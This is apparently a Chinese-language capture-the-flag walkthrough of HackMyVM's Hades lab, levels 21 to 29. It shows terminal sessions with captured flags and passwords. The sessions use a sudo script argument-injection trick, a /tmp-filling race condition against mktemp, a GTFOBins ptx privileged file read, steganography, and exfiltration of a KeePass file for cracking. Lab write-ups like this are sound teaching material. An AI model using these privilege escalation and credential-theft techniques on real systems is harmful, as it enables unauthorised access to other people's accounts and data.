## 21 cassiopeia
```bash
cassiopeia@hades:~$ ls -la
total 32
drwxr-x--- 2 root       cassiopeia 4096 Apr  5 06:36 .
drwxr-xr-x 1 root       root       4096 Apr  5 06:36 ..
-rw-r--r-- 1 cassiopeia cassiopeia  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 cassiopeia cassiopeia 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 cassiopeia cassiopeia  807 Apr 23  2023 .profile
-rw-r----- 1 root       cassiopeia   22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root       cassiopeia  131 Apr  5 06:36 mission.txt
cassiopeia@hades:~$ grep -ra '\^*\^' .
./flagz.txt:^GyWbcpEpqMsqMsjilzX^
cassiopeia@hades:~$ cat mission.txt 
################
# MISSION 0x21 #
################

## EN ##
User clio hates spaces. 

## ES ##
La usuaria clio odia los espacios.
cassiopeia@hades:~$ printf ' '
 cassiopeia@hades:~$ sudo -l
Matching Defaults entries for cassiopeia on hades:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User cassiopeia may run the following commands on hades:
    (clio) NOPASSWD: /bin/bash -c /usr/local/src/differences.sh
cassiopeia@hades:~$ sudo -u clio /bin/bash -c /usr/local/src/differences.sh
File to compare:!
aaa
/usr/bin/diff: missing operand after 'aaa'
/usr/bin/diff: Try '/usr/bin/diff --help' for more information.
cassiopeia@hades:~$ cat /usr/local/src/differences.sh

#!/bin/bash
echo File to compare:!
read differences
IFS=0 read file1 file2 <<< "$differences"

if [[ "$differences" =~ \ |\' ]]
then
   echo "No spaces!!"
else
/usr/bin/diff $file1 $file2
fi

cassiopeia@hades:~$ sudo -u clio /bin/bash -c /usr/local/src/differences.sh
File to compare:!
/dev/null0/pwned/clio/flagz.txt
0a1
> ^XUJbvPwAZYgoUgkpeSv^
```

## 22 clio
21: clio/cqJqRPaUtuoUYXbaxnZq
```bash
clio@hades:~$ ls -la
total 32
drwxr-x--- 2 root clio 4096 Apr  5 06:36 .
drwxr-xr-x 1 root root 4096 Apr  5 06:36 ..
-rw-r--r-- 1 clio clio  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 clio clio 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 clio clio  807 Apr 23  2023 .profile
-rw-r----- 1 root clio   22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root clio  169 Apr  5 06:36 mission.txt
clio@hades:~$ grep -ra '\^*\^' .
./flagz.txt:^XUJbvPwAZYgoUgkpeSv^
clio@hades:~$ cat mission.txt
################
# MISSION 0x22 #
################

## EN ##
The user cybele uses her lastname as a password.

## ES ##
La usuaria cybele usa su apellido como password.
clio@hades:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
Debian-exim:x:100:102::/var/spool/exim4:/usr/sbin/nologin
messagebus:x:101:103::/nonexistent:/usr/sbin/nologin
ftp:x:102:106:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
sshd:x:103:65534::/run/sshd:/usr/sbin/nologin
executor:x:2102:2102::/pwned/executor:/bin/bash
gemini:x:2101:2101::/pwned/gemini:/usr/sbin/nologin
hacker:x:2001:2001::/pwned/hacker:/bin/bash
asia:x:2002:2002::/pwned/asia:/bin/bash
asteria:x:2003:2003::/pwned/asteria:/bin/bash
astraea:x:2004:2004::/pwned/astraea:/bin/bash
atalanta:x:2005:2005::/pwned/atalanta:/bin/bash
athena:x:2006:2006::/pwned/athena:/bin/bash
aura:x:2007:2007::/pwned/aura:/bin/bash
aegle:x:2008:2008::/pwned/aegle:/bin/bash
calliope:x:2009:2009::/pwned/calliope:/bin/bash
calypso:x:2010:2010::/pwned/calypso:/bin/bash
cassandra:x:2011:2011::/pwned/cassandra:/bin/bash
cassiopeia:x:2012:2012::/pwned/cassiopeia:/bin/bash
clio:x:2013:2013::/pwned/clio:/bin/bash
cybele:x:2014:2014:UICacOPmJMWbKyPwNZod:/pwned/cybele:/bin/bash
cynthia:x:2015:2015::/pwned/cynthia:/bin/bash
daphne:x:2016:2016::/pwned/daphne:/bin/bash
delia:x:2017:2017::/pwned/delia:/bin/bash
demeter:x:2018:2018::/pwned/demeter:/bin/bash
echo:x:2019:2019::/pwned/echo:/bin/bash
eos:x:2020:2020::/pwned/eos:/bin/bash
gaia:x:2021:2021::/pwned/gaia:/bin/bash
halcyon:x:2022:2022::/pwned/halcyon:/bin/bash
hebe:x:2023:2023::/pwned/hebe:/bin/bash
hera:x:2024:2024::/pwned/hera:/bin/bash
hermione:x:2025:2025::/pwned/hermione:/bin/bash
hero:x:2026:2026::/pwned/hero:/bin/bash
hestia:x:2027:2027::/pwned/hestia:/bin/bash
ianthe:x:2028:2028::/pwned/ianthe:/bin/bash
irene:x:2029:2029::/pwned/irene:/bin/bash
iris:x:2030:2030::/pwned/iris:/bin/bash
kore:x:2031:2031::/pwned/kore:/bin/bash
leda:x:2032:2032::/pwned/leda:/bin/bash
maia:x:2033:2033::/pwned/maia:/bin/bash
nephele:x:2034:2034::/pwned/nephele:/bin/bash
nyx:x:2035:2035::/pwned/nyx:/bin/bash
pallas:x:2036:2036::/pwned/pallas:/bin/bash
pandora:x:2037:2037::/pwned/pandora:/bin/bash
penelope:x:2038:2038::/pwned/penelope:/bin/bash
phoebe:x:2039:2039::/pwned/phoebe:/bin/bash
rhea:x:2040:2040::/pwned/rhea:/bin/bash
selene:x:2041:2041::/pwned/selene:/bin/bash
maria:x:2042:2042::/pwned/maria:/bin/bash
acantha:x:2043:2043::/pwned/acantha:/bin/bash
alala:x:2044:2044::/pwned/alala:/bin/bash
althea:x:2045:2045::/pwned/althea:/bin/bash
andromeda:x:2046:2046::/pwned/andromeda:/bin/bash
anthea:x:2047:2047::/pwned/anthea:/bin/bash
aphrodite:x:2048:2048::/pwned/aphrodite:/bin/bash
ariadne:x:2049:2049::/pwned/ariadne:/bin/bash
arete:x:2050:2050::/pwned/arete:/bin/bash
artemis:x:2051:2051::/pwned/artemis:/bin/rbash
anonymous:x:2103:2103::/home/anonymous:/bin/bash
maritrini:x:2056:2056::/home/maritrini:/bin/bash
clio@hades:~$ cat /etc/passwd | grep 'cybele'
cybele:x:2014:2014:UICacOPmJMWbKyPwNZod:/pwned/cybele:/bin/bash
```

## 23 cybele
```bash
cybele@hades:~$ ls -la
total 3220
drwxr-x--- 2 root   cybele    4096 Apr  5 06:36 .
drwxr-xr-x 1 root   root      4096 Apr  5 06:36 ..
-rw-r--r-- 1 cybele cybele     220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 cybele cybele    3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 cybele cybele     807 Apr 23  2023 .profile
-rw-r----- 1 root   cybele      22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root   cybele 3263057 Dec 30  2021 fun.png
-rw-r----- 1 root   cybele     163 Apr  5 06:36 mission.txt
cybele@hades:~$ cat flagz.txt 
^bTsTIOmJELcaxEiIaCA^
cybele@hades:~$ cat mission.txt 
################
# MISSION 0x23 #
################

## EN ##
User cynthia sees things that others dont.

## ES ##
La usuaria cynthia ve cosas que el resto no ven.
```
传到本地看一下是否存在隐写：
```bash

                                                      .     **                                   
                                                   *           *.                                 
                                                                  ,*                              
                                                                     *,                            
                                             ,                         ,*                         
                                          .,                              *,                       
                                       /                                    *                    
                                    ,*                                        *,                  
                                 /.                                            .*.                 
                                                                _____                     
                __     __           _____         ____________      _____\    \            _____   
                /  \   /  \        /      |_       \           \    /    / |    |      _____\    \  
                /   /| |\   \      /         \       \           \  /    /  /___/|     /    / \    | 
                /   //   \   \    |     /\    \       |    /\     ||    |__ |___|/    |    |  /___/| 
                /    \_____/    \   |    |  |    \      |   |  |    ||       \       ____\    \ |   ||
                /    /\_____/\    \  |     \/      \     |    \/     ||     __/ __   /    /\    \|___|/
                /    //\_____/\    \ |\      /\     \   /           /||\    \  /  \ |    |/ \    \
                /____/ |       | \____\| \_____\ \_____\ /___________/ || \____\/    ||\____\ /____/|
                |    | |       | |    || |     | |     ||           | / | |    |____/|| |   ||    | |
                |____|/         \|____| \|_____|\|_____||___________|/   \|____|   | | \|___||____|/
                                                                        |___|/

                                       **                                    **.
                                          ,*                                **
                                             *,                          ,*
                                                *                      **
                                                *,                .*
                                                   *.           **
                                                      **      ,*,
                                                         ** *,
                                        [== HMVLabs Chapter 2: Hades ==]

                                         +===========================+
                                         |        Respect &          |
                                         |        Have fun!          |
                                         |                           |
                                         | https://hackmyvm.eu/hades |
                                         +===========================+


cybele@hades.hackmyvm.eu's password: 
fun.png                                                                                                                                             100% 3187KB 458.6KB/s   00:06    
hgbe02@pwn:~/temp$ foremost fun.png 
Processing: fun.png
|*|
hgbe02@pwn:~/temp$ binwalk fun.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1600 x 1980, 8-bit/color RGBA, non-interlaced
41            0x29            Zlib compressed data, default compression

hgbe02@pwn:~/temp$ ls
073  chfn  fun.png  music.iso  output  ret2text  tmp
hgbe02@pwn:~/temp$ cd output/
hgbe02@pwn:~/temp/output$ ls
audit.txt  png
hgbe02@pwn:~/temp/output$ cat audit.txt 
Foremost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick Mikus
Audit File

Foremost started at Wed Jul  3 13:57:59 2024
Invocation: foremost fun.png
Output directory: /home/hgbe02/temp/output
Configuration file: /etc/foremost.conf
------------------------------------------------------------------
File: fun.png
Start: Wed Jul  3 13:57:59 2024
Length: 3 MB (3263057 bytes)

Num      Name (bs=512)         Size      File Offset     Comment

0:      00000000.png           3 MB               0       (1600 x 1980)
Finish: Wed Jul  3 13:57:59 2024

1 FILES EXTRACTED

png:= 1
------------------------------------------------------------------

Foremost finished at Wed Jul  3 13:57:59 2024
```
尝试使用`stegsolve`看一下，发现在`Red plane 0`处的左上角存在密码，ocr一下即可：**QHLjXdGSiRShtWpMwFjj**

## 24 cynthia
```bash
es:~$ ls -la
total 32
drwxr-x--- 2 root    cynthia 4096 Apr  5 06:36 .
drwxr-xr-x 1 root    root    4096 Apr  5 06:36 ..
-rw-r--r-- 1 cynthia cynthia  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 cynthia cynthia 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 cynthia cynthia  807 Apr 23  2023 .profile
-rw-r----- 1 root    cynthia   22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root    cynthia  187 Apr  5 06:36 mission.txt
cynthia@hades:~$ grep -ra '\^*\^' .
./flagz.txt:^ZRSCKeYYlHkCEiHsEOI^
cynthia@hades:~$ cat mission.txt 
################
# MISSION 0x24 #
################

## EN ##
User daphne once told us: Gemini? gem-evil.hmv? WTF?

## ES ##
La usuaria daphne nos dijo una vez: Gemini? gem-evil.hmv? WTF?
cynthia@hades:~$ cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.66.0.66     hades
127.0.0.1       hades.hmv
127.0.0.1       whatsmypass.hmv
cynthia@hades:~$ echo '127.0.0.1   gem-evil.hmv' >> /etc/hosts
-bash: /etc/hosts: Permission denied
cynthia@hades:~$ ls -la /etc/hosts
-rw-r--r-- 1 root root 228 May 24 18:23 /etc/hosts
```
这一题参考[巨魔师傅的wp](https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/HackMyVM/HMVLabs/Hades/21-30#%E8%A1%8C%E5%8A%A8-2)
```bash
hgbe02@pwn:~/temp$ cat /etc/hosts | grep "gem"
127.0.0.1       gem-evil.hmv
hgbe02@pwn:~/temp$ ssh -p 6666 cynthia@hades.hackmyvm.eu -L 1965:127.0.0.1:1965  # amfora默认端口，不要修改
hgbe02@pwn:~/temp$ ss -atlup
Netid           State            Recv-Q           Send-Q                     Local Address:Port                     Peer Address:Port          Process
udp             UNCONN           0                0                              127.0.0.1:323                           0.0.0.0:*
udp             UNCONN           0                0                                  [::1]:323                              [::]:*
tcp             LISTEN           0                128                            127.0.0.1:1965                          0.0.0.0:*              users:(("ssh",pid=375,fd=5))
tcp             LISTEN           0                128                                [::1]:1965                             [::]:*              users:(("ssh",pid=375,fd=4))
# sudo apt-get install amfora
hgbe02@pwn:~/temp$ amfora gem-evil.hmv
```
这边要开俩终端进行操作，同时确保ssh连接的那个主机一直在连接状态，连接方会弹出来：
```bash
# Welcome to mi Gemini Server! 
## What are you looking for? 
EkdtKuXCJjlFKFpKgddX
```
所以，墨师傅yyds！！！！

## 25 daphne
```bash
daphne@hades:~$ ls -la
total 36
drwxr-x--- 2 root   daphne 4096 Apr  5 06:36 .
drwxr-xr-x 1 root   root   4096 Apr  5 06:36 ..
-rw-r--r-- 1 daphne daphne  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 daphne daphne 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 daphne daphne  807 Apr 23  2023 .profile
-rw-r----- 1 root   daphne   22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root   daphne  272 Apr  5 06:36 mission.txt
-rw-r----- 1 root   daphne  174 Apr  5 06:36 old.sh
daphne@hades:~$ grep -ra '\^*\^' .
./flagz.txt:^ieOhnUKZlYZSSrIPgaJ^
daphne@hades:~$ cat mission.txt 
################
# MISSION 0x25 #
################

## EN ##
The user delia has a good memory, she only has to see her password for a few seconds to remember it.

## ES ##
La usuaria delia tiene buena memoria, solo tiene que ver unos segundos su password para recordarlo.
daphne@hades:~$ cat old.sh 

#!/bin/bash
#OUTPUT="PASSWORD_DELIA" <-- UPDATE IT!
secretfile=$(mktemp /tmp/XXX)
chmod 664 "$secretfile"
exec 5>"$secretfile"
echo $OUTPUT >&5
sleep 0.01
rm "$secretfile"

daphne@hades:~$ sudo -l
Matching Defaults entries for daphne on hades:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User daphne may run the following commands on hades:
    (delia) NOPASSWD: /bin/bash -c /usr/local/src/new.sh
```
本来想写个脚本条件竞争出来的，但是不清楚路径，这里群主的方法是将 `/tmp`目录写满，然后删掉一个，这样脚本只能创建我们删掉的那个文件名，然后我们写个脚本循环进行读取即可。
rpj7师傅的思路是写了一个循环进行创建文件，群主师傅在本地把目录捋完了以后发过去的，他给了我一个demo:

echo {{a..c}{1..3}{A..C}}{{a..c}{1..3}{A..C}}{{a..c}{1..3}{A..C}}|tr ' ' '\n'|sed 's#^#touch /tmp/#g' > aaa
运行完即可得到可以填充所有`/tmp/XXX`的命令，共20余万行，群友有人运行过了，前人栽树后人乘凉，再运行一次即可：

```bash
# terminal1
daphne@hades:~$ ls -la /tmp/ctf
-rw-r--r-- 1 daphne daphne 0 Jul  3 11:23 /tmp/ctf
daphne@hades:~$ rm /tmp/ctf
daphne@hades:~$ while :;do cat /tmp/ctf >> /tmp/pass; done
cat: /tmp/ctf: No such file or directory
cat: /tmp/ctf: No such file or directory
cat: /tmp/ctf: No such file or directory
cat: /tmp/ctf: No such file or directory
cat: /tmp/ctf: No such file or directory
..........
# terminal2
daphne@hades:~$ sudo -u delia /bin/bash -c /usr/local/src/new.sh
^[[Amktemp: failed to create file via template '/tmp/XXX': File exists
chmod: cannot access '': No such file or directory
/usr/local/src/new.sh: line 6: : No such file or directory
/usr/local/src/new.sh: line 7: 5: Bad file descriptor
rm: cannot remove '': No such file or directory
daphne@hades:~$ sudo -u delia /bin/bash -c /usr/local/src/new.sh
daphne@hades:~$ sudo -u delia /bin/bash -c /usr/local/src/new.sh
mktemp: failed to create file via template '/tmp/XXX': File exists
chmod: cannot access '': No such file or directory
/usr/local/src/new.sh: line 6: : No such file or directory
/usr/local/src/new.sh: line 7: 5: Bad file descriptor
rm: cannot remove '': No such file or directory

# terminal1
daphne@hades:~$ cat /tmp/pass | uniq -d
bNCvocyOpoMVeCtxrhTt
```

这道题用python也可以进行利用，在`/var/tmp`看到某个师傅的利用方法：
```bash
import os
import string

dic = string.ascii_letters + string.digits
for i in dic:
    for j in dic:
        for k in dic:
            os.system(f'touch /tmp/{i+j+k}')
```

## 26 delia
```bash
␍␊┌␋▒@␤▒␍␊⎽:·$ ␌┌␊▒⎼┌
␉▒⎽␤: ␌┌␊▒⎼┌: ␌⎺└└▒┼␍ ┼⎺├ °⎺┤┼␍
␍␊┌␋▒@␤▒␍␊⎽:·$ ┬␤⎺▒└␋
␍␊┌␋▒
␍␊┌␋▒@␤▒␍␊⎽:·$ ┌⎽ -┌▒
├⎺├▒┌ 48
␍⎼┬│⎼-│--- 2 ⎼⎺⎺├  ␍␊┌␋▒  4096 A⎻⎼  5 06:36 .
␍⎼┬│⎼-│⎼-│ 1 ⎼⎺⎺├  ⎼⎺⎺├   4096 A⎻⎼  5 06:36 ..
-⎼┬-⎼--⎼-- 1 ␍␊┌␋▒ ␍␊┌␋▒   220 A⎻⎼ 23  2023 .␉▒⎽␤ ┌⎺±⎺┤├
-⎼--⎼----- 1 ␍␊┌␋▒ ␍␊┌␋▒  3539 A⎻⎼  5 06:36 .␉▒⎽␤⎼␌
-⎼┬-⎼--⎼-- 1 ␍␊┌␋▒ ␍␊┌␋▒   807 A⎻⎼ 23  2023 .⎻⎼⎺°␋┌␊
-⎼┬-⎼----- 1 ⎼⎺⎺├  ␍␊┌␋▒    22 A⎻⎼  5 06:36 °┌▒±≥.├│├
-⎼┬-⎼----- 1 ⎼⎺⎺├  ␍␊┌␋▒   150 A⎻⎼  5 06:36 └␋⎽⎽␋⎺┼.├│├
---│--│--- 1 ␍␊┌␋▒ ␍␊┌␋▒ 15952 A⎻⎼  5 06:36 ⎽␤⎺┬⎻▒⎽⎽
```
你没看错，就是这样的，不是乱码，只是字符集不一样，但是数字是正常显示的，尝试转化为数字进行表示：
```bash
␍␊┌␋▒@␤▒␍␊⎽:·$ ␌┌␊▒⎼┌
␉▒⎽␤: ␌┌␊▒⎼┌: ␌⎺└└▒┼␍ ┼⎺├ °⎺┤┼␍
␍␊┌␋▒@␤▒␍␊⎽:·$ ┬␤⎺▒└␋
␍␊┌␋▒
␍␊┌␋▒@␤▒␍␊⎽:·$ ┌⎽ -┌▒
├⎺├▒┌ 48
␍⎼┬│⎼-│--- 2 ⎼⎺⎺├  ␍␊┌␋▒  4096 A⎻⎼  5 06:36 .
␍⎼┬│⎼-│⎼-│ 1 ⎼⎺⎺├  ⎼⎺⎺├   4096 A⎻⎼  5 06:36 ..
-⎼┬-⎼--⎼-- 1 ␍␊┌␋▒ ␍␊┌␋▒   220 A⎻⎼ 23  2023 .␉▒⎽␤ ┌⎺±⎺┤├
-⎼--⎼----- 1 ␍␊┌␋▒ ␍␊┌␋▒  3539 A⎻⎼  5 06:36 .␉▒⎽␤⎼␌
-⎼┬-⎼--⎼-- 1 ␍␊┌␋▒ ␍␊┌␋▒   807 A⎻⎼ 23  2023 .⎻⎼⎺°␋┌␊
-⎼┬-⎼----- 1 ⎼⎺⎺├  ␍␊┌␋▒    22 A⎻⎼  5 06:36 °┌▒±≥.├│├
-⎼┬-⎼----- 1 ⎼⎺⎺├  ␍␊┌␋▒   150 A⎻⎼  5 06:36 └␋⎽⎽␋⎺┼.├│├
---│--│--- 1 ␍␊┌␋▒ ␍␊┌␋▒ 15952 A⎻⎼  5 06:36 ⎽␤⎺┬⎻▒⎽⎽
␍␊┌␋▒@␤▒␍␊⎽:·$ ␌▒├ °┌▒±≥.├│├  ≠ ││␍ -⎻
␉▒⎽␤: ││␍: ␌⎺└└▒┼␍ ┼⎺├ °⎺┤┼␍
␍␊┌␋▒@␤▒␍␊⎽:·$ ⎺␍ -A┼ -┴├␍1 < °┌▒±≥.├│├   
   94   81  102   97   72   80  121   69  113   77  101  112  115   79  100   77
  120   81   67   81   94   10
␍␊┌␋▒@␤▒␍␊⎽:·$ ␊␌␤⎺ $LANG

␍␊┌␋▒@␤▒␍␊⎽:·$ ␊┼┴ ≠±⎼␊⎻ LANG
␍␊┌␋▒@␤▒␍␊⎽:·$ LANG=␊┼ US.UTF-8
␍␊┌␋▒@␤▒␍␊⎽:·$ ␊│⎻⎺⎼├ LANG=␊┼ US.UTF-8
␍␊┌␋▒@␤▒␍␊⎽:·$ ┤┼⎽␊├ LANG
␍␊┌␋▒@␤▒␍␊⎽:·$ ┌⎺␌▒┌␊ -▒
C
C.┤├°8
POSIX
␍␊┌␋▒@␤▒␍␊⎽:·$ ␊│⎻⎺⎼├ LANG=C.UTF-8
```
但是没有成功，直接将文件拷出来试试:
```bash
hgbe02@pwn:~/temp$ scp -P 6666 hades.hackmyvm.eu:/pwned/delia/flagz.txt .
hgbe02@hades.hackmyvm.eu's password: 
```
不行，将文件传到公共目录换个用户去读试试：
```bash
␍␊┌␋▒@␤▒␍␊⎽:·$ ␌⎻ °┌▒±≥.├│├  /┴▒⎼/├└⎻/├␊└⎻ °┌▒±.├│├
␍␊┌␋▒@␤▒␍␊⎽:·$ ␌⎻ └␋⎽⎽␋⎺┼.├│├  /┴▒⎼/├└⎻/├␊└⎻ └␋⎽⎽␋⎺┼.├│├ 
␍␊┌␋▒@␤▒␍␊⎽:·$ ⎽┤␍⎺ -┌
[⎽┤␍⎺] ⎻▒⎽⎽┬⎺⎼␍ °⎺⎼ ␍␊┌␋▒: 
S⎺⎼⎼≤, ┤⎽␊⎼ ␍␊┌␋▒ └▒≤ ┼⎺├ ⎼┤┼ ⎽┤␍⎺ ⎺┼ ␤▒␍␊⎽.
␍␊┌␋▒@␤▒␍␊⎽:·$ ␌␤└⎺␍ 777 /┴▒⎼/├└⎻/├␊└⎻ °┌▒±.├│├ 
␍␊┌␋▒@␤▒␍␊⎽:·$ ␌␤└⎺␍ 777 /┴▒⎼/├└⎻/├␊└⎻ └␋⎽⎽␋⎺┼.├│├ 
```
没有sudo任务，换个用户进行读取，对了记得要修改权限，不然读不了，悲
```bash
daphne@hades:~$ cat /var/tmp/temp_flag.txt 
^QfaHPyEqMepsOdMxQCQ^
daphne@hades:~$ cat /var/tmp/temp_mission.txt
################
# MISSION 0x26 #
################

## EN ##
User demeter reads in another language.

## ES ##
La usuaria demeter lee en otro idioma.
```

回头看发现还有一个二进制文件，尝试运行一下：
```bash
␍␊┌␋▒@␤▒␍␊⎽:·$ ./⎽␤⎺┬⎻▒⎽⎽ 

F┐≤┤X┐┐JNONDC␤⎺▒K≥OI
```
将flag也拷过去：
```bash
␍␊┌␋▒@␤▒␍␊⎽:·$ ./⎽␤⎺┬⎻▒⎽⎽ > /┴▒⎼/├└⎻/├␊└⎻ ⎻▒⎽⎽.├│├
␍␊┌␋▒@␤▒␍␊⎽:·$ ␌␤└⎺␍ 777 /┴▒⎼/├└⎻/├␊└⎻ ⎻▒⎽⎽.├│├ 
```
读一下：
```bash
daphne@hades:~$ cat /var/tmp/temp_pass.txt 

FkyuXkkJNONDChoaKzOI
```

## 27 demeter
```bash
demeter@hades:~$ ls -la
total 32
drwxr-x--- 2 root    demeter 4096 Apr  5 06:36 .
drwxr-xr-x 1 root    root    4096 Apr  5 06:36 ..
-rw-r--r-- 1 demeter demeter  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 demeter demeter 3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 demeter demeter  807 Apr 23  2023 .profile
-rw-r----- 1 root    demeter   22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root    demeter  119 Apr  5 06:36 mission.txt
demeter@hades:~$ grep -ra '\^*\^' .
./flagz.txt:^JiviWHRVRZLSfjBuwAi^
demeter@hades:~$ cat mission.txt 
################
# MISSION 0x27 #
################

## EN ##
The user echo permute.

## ES ##
La usuaria echo permuta.
```
可以参考 https://gtfobins.github.io/gtfobins/ptx/#file-read  进行提权
It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.

LFILE=file_to_read
ptx -w 5000 "$LFILE"

```bash
demeter@hades:~$ sudo -l
Matching Defaults entries for demeter on hades:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User demeter may run the following commands on hades:
    (echo) NOPASSWD: /usr/bin/ptx
demeter@hades:~$ sudo -u echo /usr/bin/ptx -w 5000 /pwned/echo/flagz.txt
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  
                                                                                                                                                                                      
                                                                                                                                                                                      
                                                                                                                                                                                      
                                                                                                                                                                                      
                                                                                                                                                                                      
                                                                                                                                                                                      
                                                                                                                                                                                      
                                                                                                                                                                                      
                                                                                                                                                                                      
                                                                                                                                                                                      
                                                                                                                                     ^   abeDeOxlPMAABepeBHy^

```
拿下！

## 28 echo
27: echo/GztROerShmiyiCIlfepG
```bash
echo@hades:~$ ls -la
total 468
drwxr-x--- 2 root echo   4096 Apr  5 06:36 .
drwxr-xr-x 1 root root   4096 Apr  5 06:36 ..
-rw-r--r-- 1 echo echo    220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 echo echo   3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 echo echo    807 Apr 23  2023 .profile
-rw-r----- 1 root echo     22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root echo    142 Apr  5 06:36 mission.txt
-rw-r----- 1 root echo 442848 Dec 20  2021 noise.wav
echo@hades:~$ cat flagz.txt 
^abeDeOxlPMAABepeBHy^
echo@hades:~$ cat mission.txt 
################
# MISSION 0x28 #
################

## EN ##
The user eos can see the sounds.

## ES ##
La usuaria eos puede ver los sonidos.
```
很明显是隐写，可以看见音频，拿`Audacity`看一下:
```bash
hgbe02@pwn:/mnt/c/Users/Administrator/Desktop$ scp -P 6666 echo@hades.hackmyvm.eu:/pwned/echo/noise.wav .

                                                      .     **
                                                   *           *.
                                                                  ,*
                                                                     *,
                                             ,                         ,*
                                          .,                              *,
                                       /                                    *
                                    ,*                                        *,
                                 /.                                            .*.
                                                                _____
                __     __           _____         ____________      _____\    \            _____
                /  \   /  \        /      |_       \           \    /    / |    |      _____\    \
                /   /| |\   \      /         \       \           \  /    /  /___/|     /    / \    |
                /   //   \   \    |     /\    \       |    /\     ||    |__ |___|/    |    |  /___/|
                /    \_____/    \   |    |  |    \      |   |  |    ||       \       ____\    \ |   ||
                /    /\_____/\    \  |     \/      \     |    \/     ||     __/ __   /    /\    \|___|/
                /    //\_____/\    \ |\      /\     \   /           /||\    \  /  \ |    |/ \    \
                /____/ |       | \____\| \_____\ \_____\ /___________/ || \____\/    ||\____\ /____/|
                |    | |       | |    || |     | |     ||           | / | |    |____/|| |   ||    | |
                |____|/         \|____| \|_____|\|_____||___________|/   \|____|   | | \|___||____|/
                                                                        |___|/

                                       **                                    **.
                                          ,*                                **
                                             *,                          ,*
                                                *                      **
                                                *,                .*
                                                   *.           **
                                                      **      ,*,
                                                         ** *,
                                        [== HMVLabs Chapter 2: Hades ==]

                                         +===========================+
                                         |        Respect &          |
                                         |        Have fun!          |
                                         |                           |
                                         | https://hackmyvm.eu/hades |
                                         +===========================+


echo@hades.hackmyvm.eu's password: 
noise.wav                                                                                                                                           100%  432KB 285.0KB/s   00:01    

```

看了一下频谱图发现了密码: CWBKRQX

## 29 eos
```bash
eos@hades:~$ ls -la
total 36
drwxr-x--- 2 root eos  4096 Apr  5 06:36 .
drwxr-xr-x 1 root root 4096 Apr  5 06:36 ..
-rw-r--r-- 1 eos  eos   220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 eos  eos  3526 Apr 23  2023 .bashrc
-rw-r--r-- 1 eos  eos   807 Apr 23  2023 .profile
-rw-r----- 1 root eos    22 Apr  5 06:36 flagz.txt
-rw-r----- 1 root eos   181 Apr  5 06:36 mission.txt
-r-xr-x--- 1 root eos  1902 Apr  5 06:36 secretz.kbdx
eos@hades:~$ cat flagz.txt 
^OsoLytPlXEjvinhCNyy^
eos@hades:~$ cat mission.txt 
################
# MISSION 0x29 #
################

## EN ##
The user gaia is very careful saving her passwords.

## ES ##
La usuaria gaia es muy precavida guardando sus passwords.
```
尝试进行爆破，然后进行提取密码，可以尝试john结合`在线网站`的方法，或者直接使用 Passware进行爆破使用：
```bash
eos@hades:~$ cp secretz.kbdx /var/tmp/secretz.kbdx 
eos@hades:~$ chmod 777 /var/tmp/secretz.kbdx
hgbe02@pwn:/mnt/c/Users/Administrator/Desktop$ scp -P 6666 eos@hades.hackmyvm.eu:/var/tmp/secretz.kbdx .

                                                      .     **
                                                   *           *.
                                                                  ,*
                                                                     *,
                                             ,                         ,*
                                          .,                              *,
                                       /                                    *
